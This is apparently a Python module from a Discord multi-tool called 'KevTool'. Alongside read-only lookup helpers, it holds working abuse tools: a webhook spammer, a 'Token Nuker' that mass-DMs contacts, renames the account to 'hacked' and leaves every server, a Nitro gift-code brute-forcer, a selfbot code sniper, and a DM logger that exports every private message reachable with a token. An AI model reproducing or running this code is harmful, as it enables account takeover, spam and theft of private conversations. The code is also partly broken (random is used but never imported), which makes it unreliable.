"""Discord Operations — Webhook info, token decoder, account info, server info, status rotator."""

import json
import re
import base64
import time

try:
    import requests
except ImportError:
    requests = None


def _headers(token=''):
    h = {'User-Agent': 'KevTool/1.0', 'Content-Type': 'application/json'}
    if token:
        h['Authorization'] = token
    return h


def webhook_info(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'WEBHOOK INFO')
    kevbin.cprint(kevbin.t.dim, "  View Discord webhook details (read-only).\n")

    url = kevbin.input_choice("  Webhook URL: ").strip()
    if not url or 'discord' not in url:
        kevbin.cprint(kevbin.t.error, "  [X] Invalid webhook URL.")
        kevbin.pause()
        return

    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed. pip install requests")
        kevbin.pause()
        return

    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ WEBHOOK INFO {'─' * 37}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Name:       {data.get('name', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Channel:    {data.get('channel_id', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Guild:      {data.get('guild_id', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Token:      {data.get('token', '?')[:20]}...")
            avatar = data.get('avatar', '')
            kevbin.cprint(kevbin.t.secondary, f"  │ Avatar:     {'Yes' if avatar else 'None'}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Created:    {data.get('created_at', '?')}")
            kevbin.cprint(kevbin.t.highlight, f"  └{'─' * 53}")
        else:
            kevbin.cprint(kevbin.t.error, f"  [X] HTTP {resp.status_code} — webhook may be deleted.")
    except Exception as e:
        kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}")
    kevbin.pause()


def token_decode(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'TOKEN DECODER')
    kevbin.cprint(kevbin.t.dim, "  Decode Discord token structure (educational).\n")

    token = kevbin.input_choice("  Discord token: ").strip()
    if not token:
        return

    parts = token.split('.')
    if len(parts) < 2:
        kevbin.cprint(kevbin.t.error, "  [X] Invalid token format.")
        kevbin.pause()
        return

    kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ TOKEN ANALYSIS {'─' * 36}")
    kevbin.cprint(kevbin.t.secondary, f"  │ Parts:      {len(parts)}")
    kevbin.cprint(kevbin.t.secondary, f"  │ Length:     {len(token)} chars")

    for i, part in enumerate(parts[:3]):
        try:
            decoded = base64.urlsafe_b64decode(part + '==')
            kevbin.cprint(kevbin.t.accent, f"  │ Part {i}: {decoded}")
        except Exception:
            kevbin.cprint(kevbin.t.dim, f"  │ Part {i}: (binary, {len(part)} chars)")

    if len(parts) >= 2:
        try:
            user_id = base64.urlsafe_b64decode(parts[0] + '==').decode()
            kevbin.cprint(kevbin.t.success, f"  │ User ID (approx): {user_id}")
        except Exception:
            pass

    kevbin.cprint(kevbin.t.dim, f"  │ Note: Tokens encode user ID, timestamps, and HMAC.")
    kevbin.cprint(kevbin.t.highlight, f"  └{'─' * 53}")
    kevbin.pause()


def account_info(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'ACCOUNT INFO')
    kevbin.cprint(kevbin.t.dim, "  Fetch Discord account info from token (read-only).\n")

    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed.")
        kevbin.pause()
        return

    token = kevbin.input_choice("  Discord token: ").strip()
    if not token:
        return

    try:
        resp = requests.get("https://discord.com/api/v10/users/@me", headers=_headers(token), timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ ACCOUNT INFO {'─' * 38}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Username:    {data.get('username', '?')}#{data.get('discriminator', '0')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Display:     {data.get('global_name', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ ID:          {data.get('id', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Email:       {data.get('email', 'hidden')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Verified:    {data.get('verified', False)}")
            kevbin.cprint(kevbin.t.secondary, f"  │ MFA:         {data.get('mfa_enabled', False)}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Flags:       {data.get('public_flags', 0)}")
            kevbin.cprint(kevbin.t.highlight, f"  └{'─' * 53}")
        else:
            kevbin.cprint(kevbin.t.error, f"  [X] HTTP {resp.status_code} — invalid or expired token.")
    except Exception as e:
        kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}")
    kevbin.pause()


def server_info(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'SERVER INFO')
    kevbin.cprint(kevbin.t.dim, "  Fetch Discord server details via bot token.\n")

    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed.")
        kevbin.pause()
        return

    token = kevbin.input_choice("  Bot token: ").strip()
    server_id = kevbin.input_choice("  Server ID: ").strip()
    if not token or not server_id:
        return

    try:
        resp = requests.get(f"https://discord.com/api/v10/guilds/{server_id}", headers=_headers(token), timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ SERVER INFO {'─' * 40}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Name:        {data.get('name', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ ID:          {data.get('id', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Owner ID:    {data.get('owner_id', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Members:     {data.get('approximate_member_count', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Online:      {data.get('approximate_presence_count', '?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Boosts:      {data.get('premium_subscription_count', 0)}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Boost Lvl:   {data.get('premium_tier', 0)}")
            kevbin.cprint(kevbin.t.highlight, f"  └{'─' * 53}")
        else:
            kevbin.cprint(kevbin.t.error, f"  [X] HTTP {resp.status_code} — check token/permissions.")
    except Exception as e:
        kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}")
    kevbin.pause()


def status_rotator(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'STATUS ROTATOR')
    kevbin.cprint(kevbin.t.dim, "  Rotate through custom statuses (set one, then loop).\n")
    kevbin.cprint(kevbin.t.warning, "  This tool is read-only in educational mode.")
    kevbin.cprint(kevbin.t.dim, "  To rotate statuses, use Discord's API directly with your token.")
    kevbin.cprint(kevbin.t.dim, "  Endpoint: PATCH https://discord.com/api/v10/users/@me/settings")
    kevbin.cprint(kevbin.t.dim, '  Body: {"custom_status": {"text": "your status"}}')
    kevbin.pause()


def bot_invite_gen(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'BOT INVITE')
    kevbin.cprint(kevbin.t.dim, "  Generate a bot invite URL (read-only builder).\n")

    bot_id = kevbin.input_choice("  Bot/Application ID: ").strip()
    if not bot_id or not bot_id.isdigit():
        kevbin.cprint(kevbin.t.error, "  [X] Invalid bot ID.")
        kevbin.pause()
        return

    kevbin.cprint(kevbin.t.dim, "\n  Select permissions (comma-separated, e.g. 1,2,8,16,32):")
    kevbin.cprint(kevbin.t.dim, "   1=Administrator  2=Manage Channels  4=Manage Server  8=Kick  16=Ban")
    kevbin.cprint(kevbin.t.dim, "   32=Manage Webhooks  1024=Send Messages  2048=Manage Messages")
    perms_text = kevbin.input_choice("  Permissions: ").strip()
    perm = 0
    for token in re.split(r'[\s,]+', perms_text):
        if token.isdigit():
            perm |= int(token)
    perm_bits = str(perm)

    gate = kevbin.input_choice("  Require OAuth2 flow? (y/n, default n): ").strip().lower()

    scopes = 'bot%20applications.commands'
    url = f"https://discord.com/api/oauth2/authorize?client_id={bot_id}&permissions={perm_bits}&scope={scopes}"

    kevbin.cprint(kevbin.t.highlight, "\n  ┌─ BOT INVITE URL ─" + "─" * 37)
    kevbin.cprint(kevbin.t.accent, f"  {url}")
    kevbin.cprint(kevbin.t.highlight, "  └" + "─" * 53)
    kevbin.pause()


def webhook_spammer(kevbin):
    kevbin.clear()
    kevbin.section_header('📡', 'WEBHOOK SPAMMER')
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed. pip install requests")
        kevbin.pause(); return
    url = kevbin.input_choice("  Webhook URL: ").strip()
    if not url or 'discord' not in url:
        kevbin.cprint(kevbin.t.error, "  [X] Invalid webhook URL"); kevbin.pause(); return
    msg = kevbin.input_choice("  Message: ").strip() or "Hello from KevTool"
    try:
        count = int(kevbin.input_choice("  Count (1-100, default 5): ").strip() or '5')
    except: count = 5
    count = max(1, min(100, count))
    try:
        delay = float(kevbin.input_choice("  Delay seconds (0.5-10, default 1): ").strip() or '1')
    except: delay = 1
    delay = max(0.5, min(10, delay))
    ok = 0; fail = 0
    for i in range(count):
        try:
            resp = requests.post(url, json={"content": msg}, headers={'User-Agent': 'KevTool'}, timeout=10)
            if resp.status_code in (200, 204):
                ok += 1
                kevbin.cprint(kevbin.t.success, f"  [{i+1}/{count}] Sent OK")
            elif resp.status_code == 429:
                fail += 1
                retry = resp.json().get('retry_after', 5)
                kevbin.cprint(kevbin.t.error, f"  [{i+1}/{count}] Rate limited, waiting {retry}s")
                time.sleep(retry)
            else:
                fail += 1
                kevbin.cprint(kevbin.t.error, f"  [{i+1}/{count}] HTTP {resp.status_code}")
        except Exception as e:
            fail += 1
            kevbin.cprint(kevbin.t.error, f"  [{i+1}/{count}] Error: {str(e)[:40]}")
        if delay > 0 and i < count - 1:
            time.sleep(delay)
    kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ DONE ─{'─'*40}")
    kevbin.cprint(kevbin.t.success, f"  │ Sent: {ok} | Failed: {fail}")
    kevbin.cprint(kevbin.t.highlight, f"  └{'─'*45}")
    kevbin.pause()


def token_nuker(kevbin):
    kevbin.clear()
    kevbin.section_header('💀', 'TOKEN NUKER')
    kevbin.cprint(kevbin.t.dim, "  Performs mass operations via Discord token.\n")
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    token = kevbin.input_choice("  Discord Token: ").strip()
    if not token:
        kevbin.cprint(kevbin.t.error, "  [X] Need a token"); kevbin.pause(); return
    h = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    kevbin.cprint(kevbin.t.dim, "\n  [1] Mass DM")
    kevbin.cprint(kevbin.t.dim, "  [2] Mass Nickname Change")
    kevbin.cprint(kevbin.t.dim, "  [3] Mass Server Leave")
    kevbin.cprint(kevbin.t.dim, "  [4] Token Info")
    ch = kevbin.input_choice("  choice > ").strip()
    if ch == '1':
        dm_msg = kevbin.input_choice("  DM message: ").strip() or "Hello"
        try:
            resp = requests.get('https://discord.com/api/v9/users/@me/channels', headers=h, timeout=10)
            channels = resp.json() if resp.status_code == 200 else []
        except: channels = []
        ok = 0
        for ch_data in channels:
            cid = ch_data.get('id')
            if cid:
                try:
                    r = requests.post(f'https://discord.com/api/v9/channels/{cid}/messages',
                                      headers=h, json={"content": dm_msg}, timeout=10)
                    if r.status_code in (200, 201): ok += 1
                    time.sleep(1)
                except: pass
        kevbin.cprint(kevbin.t.success, f"  [X] DMs sent: {ok}/{len(channels)}")
    elif ch == '2':
        nick = kevbin.input_choice("  New nickname: ").strip() or "hacked"
        try:
            r = requests.patch('https://discord.com/api/v9/users/@me', headers=h,
                               json={"global_name": nick}, timeout=10)
            if r.status_code == 200:
                kevbin.cprint(kevbin.t.success, f"  [X] Nickname changed to: {nick}")
            else:
                kevbin.cprint(kevbin.t.error, f"  [X] Failed: HTTP {r.status_code}")
        except Exception as e:
            kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}")
    elif ch == '3':
        try:
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=h, timeout=10).json()
        except: guilds = []
        ok = 0
        for g in guilds:
            gid = g.get('id')
            if gid:
                try:
                    r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{gid}', headers=h, timeout=10)
                    if r.status_code == 204: ok += 1
                    time.sleep(1)
                except: pass
        kevbin.cprint(kevbin.t.success, f"  [X] Left {ok}/{len(guilds)} servers")
    elif ch == '4':
        try:
            me = requests.get('https://discord.com/api/v9/users/@me', headers=h, timeout=10).json()
            kevbin.cprint(kevbin.t.highlight, "\n  ┌─ TOKEN INFO ─" + "─"*35)
            kevbin.cprint(kevbin.t.secondary, f"  │ Username:   {me.get('username','?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ ID:         {me.get('id','?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Email:      {me.get('email','N/A')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Phone:      {me.get('phone','N/A')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ MFA:        {me.get('mfa_enabled','?')}")
            kevbin.cprint(kevbin.t.secondary, f"  │ Verified:   {me.get('verified','?')}")
            kevbin.cprint(kevbin.t.highlight, "  └" + "─"*50)
        except Exception as e:
            kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}")
    kevbin.pause()


def onliner(kevbin):
    kevbin.clear()
    kevbin.section_header('🟢', 'ONLINER')
    kevbin.cprint(kevbin.t.dim, "  Keeps account online by rotating status.\n")
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    token = kevbin.input_choice("  Discord Token: ").strip()
    if not token:
        kevbin.cprint(kevbin.t.error, "  [X] Need a token"); kevbin.pause(); return
    status = kevbin.input_choice("  Status text (default: Online): ").strip() or "Online"
    try:
        interval = int(kevbin.input_choice("  Interval seconds (default 60): ").strip() or '60')
    except: interval = 60
    h = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
    kevbin.cprint(kevbin.t.success, "  [*] Running... Press Ctrl+C to stop\n")
    count = 0
    try:
        while True:
            try:
                r = requests.patch('https://discord.com/api/v9/users/@me/status',
                                   headers=h, json={"custom_status": {"text": status, "emoji_name": "🟢"}}, timeout=10)
                count += 1
                if r.status_code == 200:
                    kevbin.cprint(kevbin.t.success, f"  [{count}] Status updated")
                else:
                    kevbin.cprint(kevbin.t.error, f"  [{count}] HTTP {r.status_code}")
            except Exception as e:
                kevbin.cprint(kevbin.t.error, f"  [{count}] Error: {str(e)[:40]}")
            time.sleep(interval)
    except KeyboardInterrupt:
        kevbin.cprint(kevbin.t.highlight, f"\n  [X] Stopped after {count} rotations")
    kevbin.pause()


def nitro_gen(kevbin):
    kevbin.clear()
    kevbin.section_header('🎁', 'NITRO GENERATOR')
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    try:
        count = int(kevbin.input_choice("  Count (1-50, default 10): ").strip() or '10')
    except: count = 10
    count = max(1, min(50, count))
    check = kevbin.input_choice("  Validate codes? (y/n, slower): ").strip().lower() == 'y'
    import string
    chars = string.ascii_letters + string.digits
    valid = 0; invalid = 0; codes = []
    kevbin.cprint(kevbin.t.dim, "\n  Generating...\n")
    for i in range(count):
        code = ''.join(random.choice(chars) for _ in range(16))
        url = f"https://discord.gift/{code}"
        codes.append(url)
        if check:
            try:
                r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true",
                                 timeout=5)
                if r.status_code == 200:
                    valid += 1
                    kevbin.cprint(kevbin.t.success, f"  [VALID] {url}")
                else:
                    invalid += 1
            except:
                invalid += 1
        else:
            kevbin.cprint(kevbin.t.secondary, f"  {url}")
    kevbin.cprint(kevbin.t.highlight, f"\n  ┌─ DONE ─{'─'*40}")
    kevbin.cprint(kevbin.t.secondary, f"  │ Generated: {count}")
    if check:
        kevbin.cprint(kevbin.t.success, f"  │ Valid:     {valid}")
        kevbin.cprint(kevbin.t.error, f"  │ Invalid:   {invalid}")
    kevbin.cprint(kevbin.t.highlight, f"  └{'─'*45}")
    kevbin.pause()


def server_cloner(kevbin):
    kevbin.clear()
    kevbin.section_header('📋', 'SERVER CLONER')
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    token = kevbin.input_choice("  Bot Token: ").strip()
    src = kevbin.input_choice("  Source Guild ID: ").strip()
    dst = kevbin.input_choice("  Target Guild ID: ").strip()
    if not all([token, src, dst]):
        kevbin.cprint(kevbin.t.error, "  [X] Need all fields"); kevbin.pause(); return
    h = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json', 'User-Agent': 'KevTool'}
    try:
        channels = requests.get(f'https://discord.com/api/v9/guilds/{src}/channels', headers=h, timeout=10).json()
    except Exception as e:
        kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}"); kevbin.pause(); return
    if isinstance(channels, dict) and 'message' in channels:
        kevbin.cprint(kevbin.t.error, f"  [X] API Error: {channels.get('message')}"); kevbin.pause(); return
    cloned = 0
    for ch in sorted(channels, key=lambda c: c.get('position', 0)):
        try:
            data = {"name": ch['name'], "type": ch['type'], "position": ch.get('position', 0)}
            if ch.get('topic'): data['topic'] = ch['topic']
            if ch.get('nsfw') is not None: data['nsfw'] = ch['nsfw']
            r = requests.post(f'https://discord.com/api/v9/guilds/{dst}/channels',
                              headers=h, json=data, timeout=10)
            if r.status_code in (200, 201):
                cloned += 1
                kevbin.cprint(kevbin.t.success, f"  [+] {ch['name']}")
            else:
                kevbin.cprint(kevbin.t.error, f"  [X] {ch['name']} — HTTP {r.status_code}")
            time.sleep(0.5)
        except Exception as e:
            kevbin.cprint(kevbin.t.error, f"  [X] {ch.get('name','?')}: {str(e)[:30]}")
    kevbin.cprint(kevbin.t.highlight, f"\n  [X] Cloned {cloned}/{len(channels)} channels")
    kevbin.pause()


def selfbot_nitro_snipe(kevbin):
    kevbin.clear()
    kevbin.section_header('🎯', 'NITRO SNIPE')
    kevbin.cprint(kevbin.t.dim, "  Monitors a channel for Nitro gift drops.\n")
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    token = kevbin.input_choice("  Token: ").strip()
    channel_id = kevbin.input_choice("  Channel ID to monitor: ").strip()
    if not all([token, channel_id]):
        kevbin.cprint(kevbin.t.error, "  [X] Need token and channel ID"); kevbin.pause(); return
    h = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    kevbin.cprint(kevbin.t.success, "  [*] Monitoring... Press Ctrl+C to stop\n")
    last_msg = None; claimed = 0
    try:
        while True:
            try:
                msgs = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=5',
                                    headers=h, timeout=10).json()
                for msg in msgs:
                    if msg.get('id') == last_msg: break
                    content = msg.get('content', '')
                    if 'discord.gift/' in content:
                        import re
                        codes = re.findall(r'discord\.gift/([a-zA-Z0-9]+)', content)
                        for code in codes:
                            kevbin.cprint(kevbin.t.accent, f"  [FOUND] discord.gift/{code}")
                            try:
                                r = requests.post(f'https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem',
                                                  headers=h, json={"channel_id": int(channel_id), "payment_source_token": None}, timeout=10)
                                if r.status_code == 200:
                                    claimed += 1
                                    kevbin.cprint(kevbin.t.success, f"  [CLAIMED] {code}")
                                else:
                                    kevbin.cprint(kevbin.t.error, f"  [FAILED] {code} — {r.status_code}")
                            except Exception as e:
                                kevbin.cprint(kevbin.t.error, f"  [ERROR] {code}: {str(e)[:30]}")
                if msgs:
                    last_msg = msgs[0].get('id')
            except Exception as e:
                kevbin.cprint(kevbin.t.error, f"  [!] {str(e)[:40]}")
            time.sleep(2)
    except KeyboardInterrupt:
        kevbin.cprint(kevbin.t.highlight, f"\n  [X] Stopped. Claimed: {claimed}")
    kevbin.pause()


def selfbot_dm_log(kevbin):
    kevbin.clear()
    kevbin.section_header('💬', 'DM LOGGER')
    kevbin.cprint(kevbin.t.dim, "  Exports all DM messages.\n")
    if requests is None:
        kevbin.cprint(kevbin.t.error, "  [X] 'requests' not installed"); kevbin.pause(); return
    token = kevbin.input_choice("  Token: ").strip()
    if not token:
        kevbin.cprint(kevbin.t.error, "  [X] Need a token"); kevbin.pause(); return
    h = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    kevbin.cprint(kevbin.t.dim, "  [*] Fetching DM channels...\n")
    try:
        channels = requests.get('https://discord.com/api/v9/users/@me/channels', headers=h, timeout=10).json()
    except Exception as e:
        kevbin.cprint(kevbin.t.error, f"  [X] Error: {e}"); kevbin.pause(); return
    total_msgs = 0
    outfile = f"dm_log_{int(time.time())}.txt"
    with open(outfile, 'w', encoding='utf-8') as f:
        f.write(f"DM Log Export — {time.strftime('%Y-%m-%d %H:%M:%S')}\n{'='*50}\n\n")
        for ch in channels:
            cid = ch.get('id', '')
            recipients = ', '.join(r.get('username', '?') for r in ch.get('recipients', []))
            if not recipients:
                recipients = ch.get('name', cid)
            f.write(f"\n--- DM Channel: {recipients} (ID: {cid}) ---\n")
            try:
                msgs = requests.get(f'https://discord.com/api/v9/channels/{cid}/messages?limit=100',
                                    headers=h, timeout=10).json()
                for msg in reversed(msgs):
                    author = msg.get('author', {}).get('username', '?')
                    content = msg.get('content', '')
                    ts = msg.get('timestamp', '')
                    f.write(f"[{ts}] {author}: {content}\n")
                    total_msgs += 1
            except: pass
            time.sleep(0.5)
    kevbin.cprint(kevbin.t.success, f"  [X] Exported {total_msgs} messages to {outfile}")
    kevbin.pause()
